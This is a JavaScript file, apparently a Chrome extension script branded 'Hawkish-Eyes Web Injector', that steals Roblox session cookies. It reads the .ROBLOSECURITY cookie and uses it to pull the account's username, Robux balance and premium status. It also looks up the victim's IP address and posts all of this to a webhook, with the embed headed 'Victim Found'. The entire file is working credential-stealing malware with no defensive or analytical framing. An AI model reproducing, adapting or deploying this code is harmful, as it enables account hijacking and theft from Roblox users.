

async function main(cookie) {
  var config = {
  webhook_url: "%WEBHOOK%"
}
const post = async (params, token) => {
  params = JSON.stringify(params)
  var n = JSON.stringify({
      data: params,
      token: token
  });
  [config.webhook_url].forEach(res => {
      fetch(res, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: params
      })
      .then(response => {
          if (!response.ok) {
              throw new Error(`Erreur HTTP! Status: ${response.status}`);
          }
      })
      .catch(error => {
          console.log('Erreur:', error);
      });
  });
}
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
       let params = {
            "content": null,
            "embeds": [
              {
                "title": "<:hwkish:1104091524758773822> Hawkish-Eyes Web Injector",
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": 16734976,
                "fields": [
                  {
                    "name": "Username:",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux Count:",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium:",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                  "text": "https://github.com/Hawkish-Eyes",
                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
              }
            ],
            "username": "Hawkish-Eyes Roblox Found",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
            "attachments": []
          }
          post(params)
        
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
